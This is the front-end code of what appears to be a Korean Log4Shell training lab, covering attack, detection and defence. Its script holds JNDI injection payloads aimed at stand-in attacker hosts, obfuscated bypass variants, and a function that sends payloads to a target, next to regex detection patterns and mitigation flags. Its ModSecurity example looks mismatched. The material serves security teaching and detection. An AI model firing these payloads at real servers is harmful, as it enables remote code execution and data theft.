<div class="code-block">
    <pre><code class="language-bash"># ìš°íšŒ ì„±ê³µ ê°€ëŠ¥ì„± ë†’ìŒ
    ${${lower:j}ndi:ldap://
    ${j${k8s:k5:-ndi:l}dap://
    ${${::-j}${::-n}${::-d}${::-i}:</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
    
                        <!-- Detection Analysis -->
                        <div class="tab-pane fade" id="detection" role="tabpanel">
                            <div class="lab-container">
                                <h4 class="fw-bold mb-3">
                                    <i class="fas fa-search me-2 text-info"></i>ê³µê²© íƒì§€ ë° ë¶„ì„
                                </h4>
                                
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6 class="fw-bold">ğŸ” íƒì§€ íŒ¨í„´</h6>
                                        <div class="code-block">
    <pre><code># ì •ê·œì‹ íŒ¨í„´
    \$\{jndi:(ldap|rmi|dns|nis|iiop|corba|nds|http)://
    \$\{.*:\$\{.*\}.*\}
    \$\{[^}]*j[^}]*n[^}]*d[^}]*i[^}]*:
    
    # ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë¬¸ìì—´
    ${lower:
    ${upper:
    ${env:
    ${sys:
    ${::-</code></pre>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h6 class="fw-bold">ğŸ“Š íƒì§€ í†µê³„</h6>
                                        <div class="bg-light p-3 rounded">
                                            <div class="row text-center">
                                                <div class="col-6 mb-2">
                                                    <h4 class="text-danger" id="detectionCount">0</h4>
                                                    <small>íƒì§€ëœ ê³µê²©</small>
                                                </div>
                                                <div class="col-6 mb-2">
                                                    <h4 class="text-warning" id="attemptCount">0</h4>
                                                    <small>ì‹œë„ëœ ê³µê²©</small>
                                                </div>
                                                <div class="col-6">
                                                    <h4 class="text-success" id="blockedCount">0</h4>
                                                    <small>ì°¨ë‹¨ëœ ê³µê²©</small>
                                                </div>
                                                <div class="col-6">
                                                    <h4 class="text-info" id="bypassCount">0</h4>
                                                    <small>ìš°íšŒ ì‹œë„</small>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="mt-4">
                                    <h6 class="fw-bold">ğŸ¯ ì‹¤ì‹œê°„ íƒì§€ í…ŒìŠ¤íŠ¸</h6>
                                    <div class="input-group mb-3">
                                        <input type="text" class="form-control" id="detectionInput" 
                                               placeholder="íƒì§€ í…ŒìŠ¤íŠ¸ìš© ë¬¸ìì—´ ì…ë ¥...">
                                        <button class="btn btn-info" onclick="testDetection()">
                                            <i class="fas fa-search me-1"></i>íƒì§€ í…ŒìŠ¤íŠ¸
                                        </button>
                                    </div>
                                    <div id="detectionResult" class="mt-2"></div>
                                </div>
    
                                <div class="mt-4">
                                    <h6 class="fw-bold">ğŸ“ˆ ê³µê²© íŒ¨í„´ ë¶„ì„</h6>
                                    <div class="table-responsive">
                                        <table class="table table-sm">
                                            <thead>
                                                <tr>
                                                    <th>íŒ¨í„´ ìœ í˜•</th>
                                                    <th>ìœ„í—˜ë„</th>
                                                    <th>íƒì§€ ë‚œì´ë„</th>
                                                    <th>ì°¨ë‹¨ ê°€ëŠ¥ì„±</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <td>ê¸°ë³¸ JNDI</td>
                                                    <td><span class="badge bg-danger">Critical</span></td>
                                                    <td><span class="badge bg-success">ì‰¬ì›€</span></td>
                                                    <td><span class="badge bg-success">ë†’ìŒ</span></td>
                                                </tr>
                                                <tr>
                                                    <td>ëŒ€ì†Œë¬¸ì ìš°íšŒ</td>
                                                    <td><span class="badge bg-danger">Critical</span></td>
                                                    <td><span class="badge bg-warning">ë³´í†µ</span></td>
                                                    <td><span class="badge bg-warning">ë³´í†µ</span></td>
                                                </tr>
                                                <tr>
                                                    <td>í™˜ê²½ë³€ìˆ˜ ìš°íšŒ</td>
                                                    <td><span class="badge bg-danger">Critical</span></td>
                                                    <td><span class="badge bg-danger">ì–´ë ¤ì›€</span></td>
                                                    <td><span class="badge bg-danger">ë‚®ìŒ</span></td>
                                                </tr>
                                                <tr>
                                                    <td>ì¤‘ì²© í‘œí˜„ì‹</td>
                                                    <td><span class="badge bg-danger">Critical</span></td>
                                                    <td><span class="badge bg-danger">ë§¤ìš° ì–´ë ¤ì›€</span></td>
                                                    <td><span class="badge bg-danger">ë§¤ìš° ë‚®ìŒ</span></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
    
                        <!-- Defense Techniques -->
                        <div class="tab-pane fade" id="defense" role="tabpanel">
                            <div class="lab-container">
                                <h4 class="fw-bold mb-3">
                                    <i class="fas fa-shield-alt me-2 text-success"></i>ë°©ì–´ ë° ì™„í™” ê¸°ë²•
                                </h4>
                                
                                <div class="step-card severity-critical">
                                    <h6 class="fw-bold text-danger">ğŸš¨ ì¦‰ì‹œ ì¡°ì¹˜ ì‚¬í•­</h6>
                                    <ol>
                                        <li><strong>Log4j ì—…ê·¸ë ˆì´ë“œ</strong>: 2.17.1 ì´ìƒìœ¼ë¡œ ì¦‰ì‹œ ì—…ë°ì´íŠ¸</li>
                                        <li><strong>JVM í”Œë˜ê·¸ ì„¤ì •</strong>: <code>-Dlog4j2.formatMsgNoLookups=true</code></li>
                                        <li><strong>ë„¤íŠ¸ì›Œí¬ ì°¨ë‹¨</strong>: ì•„ì›ƒë°”ìš´ë“œ LDAP/RMI ì—°ê²° ì°¨ë‹¨</li>
                                        <li><strong>WAF ë£° ì ìš©</strong>: JNDI íŒ¨í„´ í•„í„°ë§ ê·œì¹™ ì¶”ê°€</li>
                                    </ol>
                                </div>
    
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="step-card">
                                            <h6 class="fw-bold">ğŸ”§ ì‹œìŠ¤í…œ ì„¤ì •</h6>
                                            <div class="code-block">
    <pre><code># JVM ì˜µì…˜ ì¶”ê°€
    -Dlog4j2.formatMsgNoLookups=true
    -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
    -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
    
    # í™˜ê²½ë³€ìˆ˜ ì„¤ì •
    LOG4J_FORMAT_MSG_NO_LOOKUPS=true</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="step-card">
                                            <h6 class="fw-bold">ğŸ›¡ï¸ WAF ê·œì¹™</h6>
                                            <div class="code-block">
    <pre><code># ModSecurity ê·œì¹™ ì˜ˆì‹œ
    SecRule ARGS "@detectSQLi" \
        "id:100001,\
        phase:2,\
        block,\
        msg:'JNDI Injection Attack',\
        logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="step-card">
                                    <h6 class="fw-bold">ğŸ“‹ ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸</h6>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check1">
                                        <label class="form-check-label" for="check1">
                                            Log4j ë²„ì „ í™•ì¸ ë° ì—…ë°ì´íŠ¸
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check2">
                                        <label class="form-check-label" for="check2">
                                            JVM ë³´ì•ˆ í”Œë˜ê·¸ ì ìš©
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check3">
                                        <label class="form-check-label" for="check3">
                                            ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ ì •ì±… ê²€í† 
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check4">
                                        <label class="form-check-label" for="check4">
                                            ì…ë ¥ ê²€ì¦ ë° í•„í„°ë§ êµ¬í˜„
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check5">
                                        <label class="form-check-label" for="check5">
                                            ëª¨ë‹ˆí„°ë§ ë° íƒì§€ ì‹œìŠ¤í…œ êµ¬ì¶•
                                        </label>
                                    </div>
                                </div>
    
                                <div class="alert alert-success">
                                    <h6 class="fw-bold">
                                        <i class="fas fa-lightbulb me-2"></i>ë³´ì•ˆ ëª¨ë²” ì‚¬ë¡€
                                    </h6>
                                    <ul class="mb-0">
                                        <li>ë¡œê·¸ì— ì‚¬ìš©ì ì…ë ¥ì„ ì§ì ‘ ê¸°ë¡í•˜ì§€ ì•Šê¸°</li>
                                        <li>ì…ë ¥ ë°ì´í„° ê²€ì¦ ë° ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬</li>
                                        <li>ìµœì†Œ ê¶Œí•œ ì›ì¹™ ì ìš©</li>
                                        <li>ì •ê¸°ì ì¸ ë³´ì•ˆ íŒ¨ì¹˜ ë° ì—…ë°ì´íŠ¸</li>
                                        <li>ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ ë° ë¡œê·¸ ë¶„ì„</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
    
                <!-- Sidebar -->
                <div class="col-lg-4">
                    <!-- Real-time Log Monitor -->
                    <div class="lab-container">
                        <h6 class="fw-bold mb-3">
                            <i class="fas fa-terminal me-2"></i>ì‹¤ì‹œê°„ ë¡œê·¸ ëª¨ë‹ˆí„°
                        </h6>
                        <div class="log-terminal" id="logTerminal">
                            <div class="log-entry log-info">[ì‹œìŠ¤í…œ] Log4j ì·¨ì•½ì  ì‹¤ìŠµ í™˜ê²½ ì´ˆê¸°í™”ë¨</div>
                            <div class="log-entry log-warn">[ê²½ê³ ] ì·¨ì•½í•œ Log4j 2.14.1 ë²„ì „ ì‹¤í–‰ ì¤‘</div>
                            <div class="log-entry log-info">[ì‹œìŠ¤í…œ] JNDI ë£©ì—… í™œì„±í™”ë¨ (formatMsgNoLookups=false)</div>
                            <div class="log-entry log-info">[ì‹œìŠ¤í…œ] ì‹¤ìŠµ ëª¨ë‹ˆí„°ë§ ì‹œì‘...</div>
                        </div>
                        <div class="text-center mt-2">
                            <button class="btn btn-outline-success btn-sm" onclick="clearLogs()">
                                <i class="fas fa-trash me-1"></i>ë¡œê·¸ ì´ˆê¸°í™”
                            </button>
                            <button class="btn btn-outline-info btn-sm" onclick="toggleAutoScroll()">
                                <i class="fas fa-arrows-alt-v me-1"></i>ìë™ ìŠ¤í¬ë¡¤
                            </button>
                        </div>
                    </div>
    
                    <!-- Attack Statistics -->
                    <div class="lab-container">
                        <h6 class="fw-bold mb-3">
                            <i class="fas fa-chart-bar me-2"></i>ê³µê²© í†µê³„
                        </h6>
                        <div class="row text-center">
                            <div class="col-6 mb-3">
                                <div class="text-danger">
                                    <i class="fas fa-crosshairs fa-2x"></i>
                                    <h4 class="fw-bold mt-2" id="totalAttacks">0</h4>
                                    <small>ì´ ê³µê²© ì‹œë„</small>
                                </div>
                            </div>
                            <div class="col-6 mb-3">
                                <div class="text-warning">
                                    <i class="fas fa-exclamation-triangle fa-2x"></i>
                                    <h4 class="fw-bold mt-2" id="detectedAttacks">0</h4>
                                    <small>íƒì§€ëœ ê³µê²©</small>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="text-success">
                                    <i class="fas fa-shield-alt fa-2x"></i>
                                    <h4 class="fw-bold mt-2" id="blockedAttacks">0</h4>
                                    <small>ì°¨ë‹¨ëœ ê³µê²©</small>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="text-info">
                                    <i class="fas fa-eye fa-2x"></i>
                                    <h4 class="fw-bold mt-2" id="bypassAttempts">0</h4>
                                    <small>ìš°íšŒ ì‹œë„</small>
                                </div>
                            </div>
                        </div>
                    </div>
    
                    <!-- Quick Actions -->
                    <div class="lab-container">
                        <h6 class="fw-bold mb-3">
                            <i class="fas fa-bolt me-2"></i>ë¹ ë¥¸ ì‹¤ìŠµ
                        </h6>
                        <button class="btn btn-danger w-100 mb-2" onclick="runBasicAttack()">
                            <i class="fas fa-play me-2"></i>ê¸°ë³¸ ê³µê²© ì‹¤í–‰
                        </button>
                        <button class="btn btn-warning w-100 mb-2" onclick="runBypassAttack()">
                            <i class="fas fa-rocket me-2"></i>ìš°íšŒ ê³µê²© ì‹¤í–‰
                        </button>
                        <button class="btn btn-info w-100 mb-2" onclick="runDetectionTest()">
                            <i class="fas fa-search me-2"></i>íƒì§€ í…ŒìŠ¤íŠ¸
                        </button>
                        <button class="btn btn-success w-100" onclick="showDefenseDemo()">
                            <i class="fas fa-shield-alt me-2"></i>ë°©ì–´ ì‹œì—°
                        </button>
                    </div>
    
                    <!-- Learning Resources -->
                    <div class="lab-container">
                        <h6 class="fw-bold mb-3">
                            <i class="fas fa-book me-2"></i>í•™ìŠµ ìë£Œ
                        </h6>
                        <ul class="list-unstyled">
                            <li class="mb-2">
                                <a href="#" class="text-decoration-none" onclick="showResource('cve')">
                                    <i class="fas fa-bug me-2"></i>CVE-2021-44228 ìƒì„¸ ì •ë³´
                                </a>
                            </li>
                            <li class="mb-2">
                                <a href="#" class="text-decoration-none" onclick="showResource('timeline')">
                                    <i class="fas fa-clock me-2"></i>ì·¨ì•½ì  ë°œê²¬ íƒ€ì„ë¼ì¸
                                </a>
                            </li>
                            <li class="mb-2">
                                <a href="#" class="text-decoration-none" onclick="showResource('impact')">
                                    <i class="fas fa-globe me-2"></i>ì‹¤ì œ í”¼í•´ ì‚¬ë¡€
                                </a>
                            </li>
                            <li class="mb-2">
                                <a href="#" class="text-decoration-none" onclick="showResource('tools')">
                                    <i class="fas fa-tools me-2"></i>íƒì§€ ë° ìŠ¤ìº” ë„êµ¬
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    
        <!-- Safety Guide Modal -->
        <div class="modal fade" id="safetyGuideModal" tabindex="-1">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header bg-danger text-white">
                        <h5 class="modal-title">
                            <i class="fas fa-shield-alt me-2"></i>ì•ˆì „ ìˆ˜ì¹™ ë° ì£¼ì˜ì‚¬í•­
                        </h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <div class="alert alert-danger">
                            <h6 class="fw-bold">âš ï¸ ì ˆëŒ€ ê¸ˆì§€ ì‚¬í•­</h6>
                            <ul class="mb-0">
                                <li>ì‹¤ì œ ìš´ì˜ ì‹œìŠ¤í…œì—ì„œ ì´ ê¸°ë²• ì‚¬ìš©</li>
                                <li>íƒ€ì¸ì˜ ì‹œìŠ¤í…œì— ëŒ€í•œ ë¬´ë‹¨ í…ŒìŠ¤íŠ¸</li>
                                <li>ì•…ì˜ì  ëª©ì ìœ¼ë¡œ ì·¨ì•½ì  ì•…ìš©</li>
                                <li>êµìœ¡ ëª©ì  ì™¸ì˜ ì‚¬ìš©</li>
                            </ul>
                        </div>
    
                        <div class="alert alert-warning">
                            <h6 class="fw-bold">ğŸ”’ ë³´ì•ˆ í™˜ê²½ ìš”êµ¬ì‚¬í•­</h6>
                            <ul class="mb-0">
                                <li>ê²©ë¦¬ëœ ë„¤íŠ¸ì›Œí¬ í™˜ê²½ì—ì„œë§Œ ì‹¤ìŠµ</li>
                                <li>ì™¸ë¶€ ì¸í„°ë„· ì—°ê²° ì°¨ë‹¨ ê¶Œì¥</li>
                                <li>ì‹¤ìŠµ í›„ ì‹œìŠ¤í…œ ì´ˆê¸°í™”</li>
                                <li>ë¡œê·¸ ë°ì´í„° ë³´ì•ˆ ê´€ë¦¬</li>
                            </ul>
                        </div>
    
                        <div class="alert alert-info">
                            <h6 class="fw-bold">ğŸ“š êµìœ¡ì  ì‚¬ìš©</h6>
                            <p class="mb-0">ì´ ì‹¤ìŠµ í™˜ê²½ì€ ë³´ì•ˆ êµìœ¡ ë° ì¸ì‹ ì œê³ ë¥¼ ìœ„í•´ ì œì‘ë˜ì—ˆìŠµë‹ˆë‹¤. 
                            ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ ì–‘ì„±ê³¼ ë°©ì–´ ëŠ¥ë ¥ í–¥ìƒì´ ëª©ì ì…ë‹ˆë‹¤.</p>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">ë‹«ê¸°</button>
                        <button type="button" class="btn btn-danger" onclick="acknowledgeRisks()">
                            <i class="fas fa-check me-1"></i>ìœ„í—˜ì„±ì„ ì¸ì§€í–ˆìŠµë‹ˆë‹¤
                        </button>
                    </div>
                </div>
            </div>
        </div>
    
        <!-- Bootstrap JS -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Prism.js for code highlighting -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    
        <!-- Custom JavaScript -->
        <script>
            // Global variables
            let attackCount = 0;
            let detectionCount = 0;
            let blockedCount = 0;
            let bypassCount = 0;
            let autoScroll = true;
            let currentStep = 1;
    
            // Attack patterns
            const attackPatterns = {
                ldap: '${jndi:ldap://evil.com/exploit}',
                rmi: '${jndi:rmi://malicious.server:1099/payload}',
                dns: '${jndi:dns://exfiltrate.attacker.com/data}',
                http: '${jndi:ldap://attacker.com:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}',
                bypass1: '${${lower:jndi}:${lower:ldap}://bypass.evil.com/exploit}',
                bypass2: '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//env.attacker.com/a}',
                bypass3: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://nested.evil.com/exploit}',
                bypass4: '${jndi:ldap://base64.evil.com/${base64:dGVzdA==}}'
            };
    
            // Initialize the lab
            document.addEventListener('DOMContentLoaded', function() {
                initializeLab();
                startLogSimulation();
                updateProgress();
            });
    
            // Initialize lab environment
            function initializeLab() {
                addLogEntry('ì‹¤ìŠµ í™˜ê²½ì´ ì´ˆê¸°í™”ë˜ì—ˆìŠµë‹ˆë‹¤.', 'info');
                addLogEntry('Log4j 2.14.1 (ì·¨ì•½í•œ ë²„ì „) ë¡œë“œë¨', 'warn');
                addLogEntry('JNDI ë£©ì—… ê¸°ëŠ¥ í™œì„±í™”ë¨', 'warn');
                addLogEntry('ì‹¤ìŠµ ì¤€ë¹„ ì™„ë£Œ - ê³µê²©ì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤', 'info');
            }
    
            // Set payload in attack input
            function setPayload(type) {
                const payload = attackPatterns[type];
                document.getElementById('attackPayload').value = payload;
                addLogEntry(`ê³µê²© íŒ¨í„´ ì„¤ì •: ${type.toUpperCase()}`, 'info');
            }
    
            // Execute attack
            function executeAttack() {
                const target = document.getElementById('attackTarget').value;
                const payload = document.getElementById('attackPayload').value;
                
                if (!payload.trim()) {
                    showAlert('ê³µê²© í˜ì´ë¡œë“œë¥¼ ì…ë ¥í•˜ê±°ë‚˜ ì„ íƒí•´ì£¼ì„¸ìš”.', 'warning');
                    return;
                }
    
                attackCount++;
                updateStats();
                updateProgress();
    
                addLogEntry(`[ê³µê²© ${attackCount}] ëŒ€ìƒ: ${target}`, 'attack');
                addLogEntry(`[ê³µê²© ${attackCount}] í˜ì´ë¡œë“œ: ${payload}`, 'attack');
    
                // ì‹¤ì œ API í˜¸ì¶œ
                const requestData = target.includes('headers') ? 
                    {} : { input: payload, q: payload };
    
                fetch(target, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': payload // í—¤ë” ê³µê²©ìš©
                    },
                    body: JSON.stringify(requestData)
                })
                .then(response => {
                    addLogEntry(`[ê³µê²© ${attackCount}] ì‘ë‹µ ìƒíƒœ: ${response.status}`, 'info');
                    
                    // íŒ¨í„´ ë¶„ì„
                    analyzeAttackPattern(payload);
                    
                    return response.text();
                })
                .then(data => {
                    addLogEntry(`[ê³µê²© ${attackCount}] ì„œë²„ ì‘ë‹µ ìˆ˜ì‹ ë¨`, 'info');
                    showAttackResult(payload);
                })
                .catch(error => {
                    addLogEntry(`[ê³µê²© ${attackCount}] ì˜¤ë¥˜: ${error.message}`, 'error');
                    showAttackResult(payload);
                });
            }
    
            // Analyze attack pattern
            function analyzeAttackPattern(payload) {
                const patterns = [
                    { regex: /\$\{jndi:ldap:/, type: 'LDAP ê³µê²©', severity: 'critical' },
                    { regex: /\$\{jndi:rmi:/, type: 'RMI ê³µê²©', severity: 'critical' },
                    { regex: /\$\{jndi:dns:/, type: 'DNS ìœ ì¶œ', severity: 'high' },
                    { regex: /\$\{.*lower.*\}/, type: 'ëŒ€ì†Œë¬¸ì ìš°íšŒ', severity: 'high' },
                    { regex: /\$\{.*env.*\}/, type: 'í™˜ê²½ë³€ìˆ˜ ìš°íšŒ', severity: 'critical' },
                    { regex: /\$\{.*::-.*\}/, type: 'ì¤‘ì²© ìš°íšŒ', severity: 'critical' }
                ];
    
                let detected = false;
                patterns.forEach(pattern => {
                    if (pattern.regex.test(payload)) {
                        detectionCount++;
                        detected = true;
                        addLogEntry(`[íƒì§€] ${pattern.type} íŒ¨í„´ ê°ì§€ë¨ (ìœ„í—˜ë„: ${pattern.severity})`, 'warn');
                        showDetectionAlert(pattern.type, pattern.severity);
                    }
                });
    
                if (payload.includes('${') && payload.includes('}')) {
                    if (payload.toLowerCase().includes('bypass') || 
                        payload.includes('${env:') || 
                        payload.includes('${::-')) {
                        bypassCount++;
                        addLogEntry('[ìš°íšŒ] ê³ ê¸‰ ìš°íšŒ ê¸°ë²• ì‹œë„ ê°ì§€ë¨', 'error');
                    }
                }
    
                updateStats();
            }
    
            // Show attack result
            function showAttackResult(payload) {
                if (detectJNDIPattern(payload)) {
                    showFloatingAlert(`JNDI íŒ¨í„´ ê°ì§€: ${payload.substring(0, 50)}...`, 'danger');
                    addLogEntry('âš ï¸ ì·¨ì•½ì  ì‹¤ìŠµ ì„±ê³µ: JNDI íŒ¨í„´ì´ ë¡œê¹…ë˜ì—ˆìŠµë‹ˆë‹¤', 'attack');
                    addLogEntry('ì‹¤ì œ í™˜ê²½ì—ì„œëŠ” ì™¸ë¶€ ì„œë²„ ì—°ê²°ì´ ì‹œë„ë©ë‹ˆë‹¤', 'warn');
                } else {
                    addLogEntry('ì •ìƒì ì¸ ì…ë ¥ìœ¼ë¡œ ì²˜ë¦¬ë˜ì—ˆìŠµë‹ˆë‹¤', 'info');
                }
            }
    
            // Detection functions
            function detectJNDIPattern(input) {
                const jndiPatterns = [
                    /\$\{jndi:/i,
                    /\$\{.*j.*n.*d.*i.*:/i,
                    /ldap:\/\//i,
                    /rmi:\/\//i,
                    /dns:\/\//i
                ];
                
                return jndiPatterns.some(pattern => pattern.test(input));
            }
    
            function testDetection() {
                const input = document.getElementById('detectionInput').value;
                const resultDiv = document.getElementById('detectionResult');
                
                if (detectJNDIPattern(input)) {
                    resultDiv.innerHTML = `
                        <div class="alert alert-danger">
                            <i class="fas fa-exclamation-triangle me-2"></i>
                            <strong>ìœ„í—˜:</strong> JNDI íŒ¨í„´ì´ ê°ì§€ë˜ì—ˆìŠµë‹ˆë‹¤!
                        </div>
                    `;
                    detectionCount++;
                } else {
                    resultDiv.innerHTML = `
                        <div class="alert alert-success">
                            <i class="fas fa-check me-2"></i>
                            <strong>ì•ˆì „:</strong> ì˜ì‹¬ìŠ¤ëŸ¬ìš´ íŒ¨í„´ì´ ì—†ìŠµë‹ˆë‹¤.
                        </div>
                    `;
                }
                
                updateStats();
            }
    
            // Quick attack functions
            function runBasicAttack() {
                setPayload('ldap');
                setTimeout(() => executeAttack(), 500);
            }
    
            function runBypassAttack() {
                setPayload('bypass3');
                setTimeout(() => executeAttack(), 500);
            }
    
            function runDetectionTest() {
                document.getElementById('detectionInput').value = attackPatterns.bypass1;
                testDetection();
            }
    
            function showDefenseDemo() {
                addLogEntry('=== ë°©ì–´ ê¸°ë²• ì‹œì—° ì‹œì‘ ===', 'info');
                addLogEntry('1. JVM í”Œë˜ê·¸ ì ìš©: -Dlog4j2.formatMsgNoLookups=true', 'info');
                addLogEntry('2. JNDI íŒ¨í„´ í•„í„°ë§ í™œì„±í™”', 'info');
                addLogEntry('3. ë„¤íŠ¸ì›Œí¬ ì°¨ë‹¨ ê·œì¹™ ì ìš©', 'info');
                addLogEntry('ë°©ì–´ ê¸°ë²•ì´ ì ìš©ë˜ë©´ ê³µê²©ì´ ì°¨ë‹¨ë©ë‹ˆë‹¤', 'info');
                
                blockedCount += 3;
                updateStats();
            }
    
            // Log management
            function addLogEntry(message, type = 'info') {
                const terminal = document.getElementById('logTerminal');
                const timestamp = new Date().toLocaleTimeString();
                const logClass = `log-${type}`;
                
                const logEntry = document.createElement('div');
                logEntry.className = `log-entry ${logClass}`;
                logEntry.innerHTML = `[${timestamp}] ${message}`;
                
                terminal.appendChild(logEntry);
                
                if (autoScroll) {
                    terminal.scrollTop = terminal.scrollHeight;
                }
                
                // ë¡œê·¸ ê°œìˆ˜ ì œí•œ
                if (terminal.children.length > 100) {
                    terminal.removeChild(terminal.firstChild);
                }
            }
    
            function clearLogs() {
                document.getElementById('logTerminal').innerHTML = '';
                addLogEntry('ë¡œê·¸ê°€ ì´ˆê¸°í™”ë˜ì—ˆìŠµë‹ˆë‹¤', 'info');
            }
    
            function toggleAutoScroll() {
                autoScroll = !autoScroll;
                addLogEntry(`ìë™ ìŠ¤í¬ë¡¤ ${autoScroll ? 'í™œì„±í™”' : 'ë¹„í™œì„±í™”'}ë¨`, 'info');
            }
    
            // Statistics and progress
            function updateStats() {
                document.getElementById('totalAttacks').textContent = attackCount;
                document.getElementById('detectedAttacks').textContent = detectionCount;
                document.getElementById('blockedAttacks').textContent = blockedCount;
                document.getElementById('bypassAttempts').textContent = bypassCount;
                
                // Update detection stats
                document.getElementById('detectionCount').textContent = detectionCount;
                document.getElementById('attemptCount').textContent = attackCount;
                document.getElementById('blockedCount').textContent = blockedCount;
                document.getElementById('bypassCount').textContent = bypassCount;
            }
    
            function updateProgress() {
                const steps = document.querySelectorAll('.progress-step');
                
                // ë‹¨ê³„ë³„ ì§„í–‰ ìƒí™© ì—…ë°ì´íŠ¸
                if (attackCount >= 1) {
                    updateStepStatus(1, 'completed');
                    currentStep = Math.max(currentStep, 2);
                }
                if (attackCount >= 3) {
                    updateStepStatus(2, 'completed');
                    currentStep = Math.max(currentStep, 3);
                }
                if (bypassCount >= 1) {
                    updateStepStatus(3, 'completed');
                    currentStep = Math.max(currentStep, 4);
                }
                if (detectionCount >= 5) {
                    updateStepStatus(4, 'completed');
                }
                
                // í˜„ì¬ ë‹¨ê³„ í‘œì‹œ
                if (currentStep <= 4) {
                    updateStepStatus(currentStep, 'active');
                }
            }
    
            function updateStepStatus(stepNumber, status) {
                const step = document.querySelector(`[data-step="${stepNumber}"]`);
                if (step) {
                    step.className = `progress-step ${status}`;
                }
            }
    
            // Alert and notification functions
            function showFloatingAlert(message, type) {
                const alertsContainer = document.getElementById('floatingAlerts');
                const alert = document.createElement('div');
                alert.className = 'detection-alert';
                alert.innerHTML = `
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <i class="fas fa-exclamation-triangle me-2"></i>
                            ${message}
                        </div>
                        <button class="btn btn-sm btn-outline-light" onclick="this.parentElement.parentElement.remove()">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>
                `;
                
                alertsContainer.appendChild(alert);
                
                // 5ì´ˆ í›„ ìë™ ì œê±°
                setTimeout(() => {
                    if (alert.parentElement) {
                        alert.remove();
                    }
                }, 5000);
            }
    
            function showDetectionAlert(attackType, severity) {
                const severityColors = {
                    critical: 'danger',
                    high: 'warning',
                    medium: 'info',
                    low: 'secondary'
                };
                
                showFloatingAlert(`${attackType} ê³µê²© íƒì§€ë¨ (${severity})`, severityColors[severity]);
            }
    
            function showAlert(message, type = 'info') {
                const alertClass = {
                    'success': 'alert-success',
                    'danger': 'alert-danger',
                    'warning': 'alert-warning',
                    'info': 'alert-info'
                }[type] || 'alert-info';
    
                const alertHtml = `
                    <div class="alert ${alertClass} alert-dismissible fade show" role="alert">
                        ${message}
                        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                    </div>
                `;
    
                document.querySelector('.container').insertAdjacentHTML('afterbegin', alertHtml);
                
                setTimeout(() => {
                    const alert = document.querySelector(`.${alertClass}`);
                    if (alert) alert.remove();
                }, 5000);
            }
    
            // Modal functions
            function showSafetyGuide() {
                new bootstrap.Modal(document.getElementById('safetyGuideModal')).show();
            }
    
            function acknowledgeRisks() {
                bootstrap.Modal.getInstance(document.getElementById('safetyGuideModal')).hide();
                addLogEntry('ì‚¬ìš©ìê°€ ìœ„í—˜ì„±ì„ ì¸ì§€í•˜ê³  ì‹¤ìŠµì„ ì§„í–‰í•©ë‹ˆë‹¤', 'warn');
                showAlert('ì•ˆì „ ìˆ˜ì¹™ì„ ìˆ™ì§€í•˜ì…¨ìŠµë‹ˆë‹¤. ì‹¤ìŠµì„ ì‹œì‘í•˜ì„¸ìš”!', 'success');
            }
    
            // Resource functions
            function showResource(type) {
                const resources = {
                    cve: {
                        title: 'CVE-2021-44228 ìƒì„¸ ì •ë³´',
                        content: 'Apache Log4j2 <=2.14.1ì—ì„œ ë°œê²¬ëœ JNDI injection ì·¨ì•½ì ìœ¼ë¡œ, ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.'
                    },
                    timeline: {
                        title: 'ì·¨ì•½ì  ë°œê²¬ íƒ€ì„ë¼ì¸',
